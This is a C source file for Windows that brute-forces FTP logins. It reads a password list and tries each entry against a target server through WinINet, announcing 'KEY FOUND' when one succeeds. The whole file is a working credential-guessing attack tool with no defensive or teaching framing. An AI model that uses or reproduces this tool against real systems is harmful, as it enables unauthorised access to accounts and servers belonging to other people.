#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

void usage(char *prog) {
    printf("Usage: %s -l username -P passwordlist ftp://ip:port\n", prog);
    exit(1);
}

void try_password(char *ftp_url, char *username, char *password) {
    HINTERNET hInternet, hFtpSession;

    hInternet = InternetOpen("FTP Brute Forcer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("InternetOpen failed with error %lu\n", GetLastError());
        return;
    }

    printf("TRYING PASSPHRASE: %s\n", password);

    hFtpSession = InternetConnect(hInternet, ftp_url, INTERNET_DEFAULT_FTP_PORT, username, password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    if (hFtpSession != NULL) {
        printf("KEY FOUND: [ \"%s\" ]\n", password);
        InternetCloseHandle(hFtpSession);
        InternetCloseHandle(hInternet);
        exit(0);
    }

    InternetCloseHandle(hInternet);
}

int main(int argc, char *argv[]) {
    char *username = NULL;
    char *password_list = NULL;
    char *ftp_url = NULL;

    if (argc != 6) {
        usage(argv[0]);
    }

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-l") == 0) {
            username = argv[++i];
        } else if (strcmp(argv[i], "-P") == 0) {
            password_list = argv[++i];
        } else if (strncmp(argv[i], "ftp://", 6) == 0) {
            ftp_url = argv[i] + 6; // skip "ftp://"
        }
    }

    if (username == NULL || password_list == NULL || ftp_url == NULL) {
        usage(argv[0]);
    }

    FILE *fp = fopen(password_list, "r");
    if (fp == NULL) {
        perror("Error opening password list");
        return 1;
    }

    char password[256];
    while (fgets(password, sizeof(password), fp) != NULL) {
        password[strcspn(password, "\r\n")] = 0; // Remove newline characters
        try_password(ftp_url, username, password);
    }

    fclose(fp);
    printf("KEY NOT FOUND\n");
    return 0;
}
